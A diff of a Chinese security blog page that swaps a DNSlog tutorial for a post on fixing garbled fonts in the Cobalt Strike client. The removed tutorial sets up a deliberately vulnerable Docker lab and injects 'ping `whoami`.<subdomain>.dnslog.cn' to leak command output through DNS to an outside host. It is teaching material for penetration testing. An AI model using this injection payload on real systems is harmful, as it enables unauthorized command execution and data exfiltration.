@@ -20,25 +20,22 @@
     var CONFIG = {"hostname":"byzain.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="前言   实际渗透测试中，有些漏洞因为没有回显导致无法准确判断漏洞是否存在，可能导致渗透测试人员浪费大量精力在一个并不存在的漏洞上，因此为了验证一些无回显漏洞，可结合DNSlog平台进行测试，本文使用的DNSlog平台链接如下：http:&#x2F;&#x2F;dnslog.cn&#x2F;">
+  <meta name="description" content="Windows电脑上CS乱码了，文字都变成空心方块了。贴出两种解决方法，第一种方法我试了不行，但是有其他人成功解决了，我是用的第二种方法修复了乱码问题。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="通过DNSlog验证漏洞">
-<meta property="og:url" content="https://byzain.github.io/2021/01/18/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="CobalStrike 乱码解决">
+<meta property="og:url" content="https://byzain.github.io/2021/03/02/CobalStrike%20%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3/index.html">
 <meta property="og:site_name" content="Zain">
-<meta property="og:description" content="前言   实际渗透测试中，有些漏洞因为没有回显导致无法准确判断漏洞是否存在，可能导致渗透测试人员浪费大量精力在一个并不存在的漏洞上，因此为了验证一些无回显漏洞，可结合DNSlog平台进行测试，本文使用的DNSlog平台链接如下：http:&#x2F;&#x2F;dnslog.cn&#x2F;">
+<meta property="og:description" content="Windows电脑上CS乱码了，文字都变成空心方块了。贴出两种解决方法，第一种方法我试了不行，但是有其他人成功解决了，我是用的第二种方法修复了乱码问题。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://byzain.github.io/images/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86.png">
-<meta property="og:image" content="https://byzain.github.io/images/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/%E5%88%9B%E5%BB%BA%E5%AE%B9%E5%99%A8.png">
-<meta property="og:image" content="https://byzain.github.io/images/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/%E9%BB%98%E8%AE%A4%E9%A1%B5%E9%9D%A2.png">
-<meta property="og:image" content="https://byzain.github.io/images/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/DNSLOG%E9%A1%B5%E9%9D%A21.png">
-<meta property="og:image" content="https://byzain.github.io/images/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/DNSLOG%E9%A1%B5%E9%9D%A22.png">
-<meta property="article:published_time" content="2021-01-18T03:27:50.000Z">
-<meta property="article:modified_time" content="2021-02-02T04:00:09.256Z">
+<meta property="og:image" content="https://byzain.github.io/images/CobalStrike%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3/8e058c4d12dc8faf8757be0f56522a72.png">
+<meta property="og:image" content="https://byzain.github.io/images/CobalStrike%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3/a47f823734aad59daa35cd6dcd7a0bec.png">
+<meta property="article:published_time" content="2021-03-02T02:10:28.000Z">
+<meta property="article:modified_time" content="2021-03-02T02:18:35.891Z">
 <meta property="article:author" content="Zain">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://byzain.github.io/images/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86.png">
+<meta name="twitter:image" content="https://byzain.github.io/images/CobalStrike%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3/8e058c4d12dc8faf8757be0f56522a72.png">
 
-<link rel="canonical" href="https://byzain.github.io/2021/01/18/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/">
+<link rel="canonical" href="https://byzain.github.io/2021/03/02/CobalStrike%20%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3/">
 
 
 <script id="page-configurations">
@@ -51,7 +48,7 @@
   };
 </script>
 
-  <title>通过DNSlog验证漏洞 | Zain</title>
+  <title>CobalStrike 乱码解决 | Zain</title>
   
 
 
@@ -173,7 +170,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://byzain.github.io/2021/01/18/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/">
+    <link itemprop="mainEntityOfPage" href="https://byzain.github.io/2021/03/02/CobalStrike%20%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -186,7 +183,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          通过DNSlog验证漏洞
+          CobalStrike 乱码解决
         </h1>
 
         <div class="post-meta">
@@ -195,23 +192,17 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2021-01-18 11:27:50" itemprop="dateCreated datePublished" datetime="2021-01-18T11:27:50+08:00">2021-01-18</time>
+              <time title="Created: 2021-03-02 10:10:28 / Modified: 10:18:35" itemprop="dateCreated datePublished" datetime="2021-03-02T10:10:28+08:00">2021-03-02</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-02-02 12:00:09" itemprop="dateModified" datetime="2021-02-02T12:00:09+08:00">2021-02-02</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                  <a href="/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/" itemprop="url" rel="index"><span itemprop="name">问题解决</span></a>
                 </span>
             </span>
 
@@ -231,8 +222,8 @@
       </span>
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2021/01/18/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/18/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/" itemprop="commentCount"></span>
+    <a title="valine" href="/2021/03/02/CobalStrike%20%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/03/02/CobalStrike%20%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -247,39 +238,19 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>   实际渗透测试中，有些漏洞因为没有回显导致无法准确判断漏洞是否存在，可能导致渗透测试人员浪费大量精力在一个并不存在的漏洞上，因此为了验证一些无回显漏洞，可结合DNSlog平台进行测试，本文使用的DNSlog平台链接如下：<code>http://dnslog.cn/</code><br>   <a id="more"></a></p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>   DNSlog检测原理在此就不多赘述了，网上相关资料铺天盖地，此处引用一张FREEBUF的图用以说明，此图现在看不懂没关系，当做完实验后再返回查看本图思维就会很清晰了。</p>
-<p><img src="/images/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86.png" alt="DNS查询原理图"></p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="1-安装Docker"><a href="#1-安装Docker" class="headerlink" title="1. 安装Docker"></a>1. 安装Docker</h3><p>   接下来直接搭建靶场，进入实验环境，本实验使用Docker搭建漏洞环境，操作系统是windows 10，Docker Desktop提供了较为完善的图形化操作界面，且兼容性随着版本更新目前已经与linux下运行的Docker无区别，安装方式见官网，安装操作较为简单，无脑下一步即可，安装完成后需要重启，接着按照说明一步步安装其他必备环境，这里就不再细说了。</p>
-<h3 id="2-拉取镜像"><a href="#2-拉取镜像" class="headerlink" title="2.拉取镜像"></a>2.拉取镜像</h3><ul>
-<li><p>打开CMD/PowerShell运行以下命令：<code>docker pull ge592555078/lkwa</code>从仓库拉取镜像</p>
-</li>
-<li><p>接着打开Docker Desktop按照下图操作运行刚才拉取的环境，并<strong>将80端口映射到本地的81端口</strong>。</p>
-<p><img src="/images/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/%E5%88%9B%E5%BB%BA%E5%AE%B9%E5%99%A8.png" alt="创建容器"><br>// <em>或者在命令行中直接输入<code>docker run -d -p 81:80 ge592555078/lkwa</code></em></p>
-</li>
-<li><p>此时访问<code>http://localhost:81/</code>应当出现apache的默认页面，证明环境搭建完成：</p>
-<p><img src="/images/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/%E9%BB%98%E8%AE%A4%E9%A1%B5%E9%9D%A2.png" alt="默认页面"></p>
-</li>
-</ul>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p> 由于主要学习dnslog的使用，我们就用环境中命令执行模块复现。</p>
-<ol>
-<li><p>访问<code>http://localhost:81/index.php</code>此为漏洞环境的主页</p>
-</li>
-<li><p>左侧选择<code>Bind RCE</code>命令注入环境</p>
-</li>
-<li><p>此时访问dnslog平台：<code>http://dnslog.cn/</code>点击页面上<code>Get SubDomain</code>生成专属子域名</p>
-<p><img src="/images/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/DNSLOG%E9%A1%B5%E9%9D%A21.png" alt="DNSLOG页面"></p>
-</li>
-<li><p>回到漏洞环境，在右侧命令执行输入框中输入如下命令之后点击<code>submit</code>按钮提交执行。(whoami后应该衔接刚才生成的<strong>对应子域名</strong>)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping &#96;whoami&#96;.cp2wj5.dnslog.cn</span><br></pre></td></tr></table></figure></li>
-<li><p>再返回DNSlog平台，点击刷新解析记录按钮，可以发现whoami的执行结果已经拼接成四级域名了：</p>
-<p><img src="/images/%E9%80%9A%E8%BF%87DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/DNSLOG%E9%A1%B5%E9%9D%A22.png" alt="DNSLOG页面回显"></p>
-<p> 至此为止试验结束。</p>
-</li>
-</ol>
-<h2 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h2><p> 存在无回显漏洞的主机访问DNSlog平台就会留下DNS解析记录，可以通过DNS解析记录查看最终的执行结果，如示例中的语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping &#96;whoami&#96;.cp2wj5.dnslog.cn</span><br><span class="line">此语句实际上等于是：</span><br><span class="line">ping www-data.yafjqc.dnslog.cn</span><br></pre></td></tr></table></figure>
-<p> 包围着<code>whoami</code>的符号是反单引号，是<code>shift</code>+<code>~</code>组合打出来的符号，表示执行命令的意思，那么最终<code>ping</code>的结果就是<code>ping whoami执行后的主机名.随机三级域名.dnslog.cn</code>，解析的时候一层一层的迭代解析，最终指向<code>dnslog.cn</code>服务器上你的专属三级域名，并附带上执行结果*(四级域名)*，那么此时看dnslog服务器的DNS解析记录即可查看whoami的执行结果，如果对DNS协议不清楚此时应先去学习DNS解析原理，不然此篇文章学习起来较为吃力。</p>
+        <p>Windows电脑上CS乱码了，文字都变成空心方块了。贴出两种解决方法，第一种方法我试了不行，但是有其他人成功解决了，我是用的第二种方法修复了乱码问题。<a id="more"></a></p>
+<h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>cmd输入：regedit，进入注册表</p>
+<p>找到：计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor</p>
+<p>新建字符串值，然后编辑字符串</p>
+<p>数值名称：autorun</p>
+<p>数值数据：chcp 65001</p>
+<p>注：chcp是dos命令 后面的65001是utf-8编码的代号</p>
+<p>只输入chcp可以看当前编码。</p>
+<p><img src="/images/CobalStrike%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3/8e058c4d12dc8faf8757be0f56522a72.png" alt="注册表"></p>
+<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>修改  当前用户/.aggressor.prop</p>
+<p>在最后一行加入</p>
+<p><code>client.font.font=Microsoft-YaHei-UI 10</code></p>
+<p><img src="/images/CobalStrike%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3/a47f823734aad59daa35cd6dcd7a0bec.png" alt="User目录"></p>
 
     </div>
 
@@ -294,11 +265,11 @@
 
         
     <div class="post-nav">
-      <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/2021/01/21/ActiveMQ%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2016-3088/" rel="next" title="ActiveMQ弱口令漏洞利用（CVE-2016-3088）">
-      ActiveMQ弱口令漏洞利用（CVE-2016-3088） <i class="fa fa-chevron-right"></i>
+    <a href="/2021/03/01/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="prev" title="Windows应急响应">
+      <i class="fa fa-chevron-left"></i> Windows应急响应
     </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -358,7 +329,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%AE%89%E8%A3%85Docker"><span class="nav-number">3.1.</span> <span class="nav-text">1. 安装Docker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%8B%89%E5%8F%96%E9%95%9C%E5%83%8F"><span class="nav-number">3.2.</span> <span class="nav-text">2.拉取镜像</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">4.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">分析总结</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">方法一：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">方法二：</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
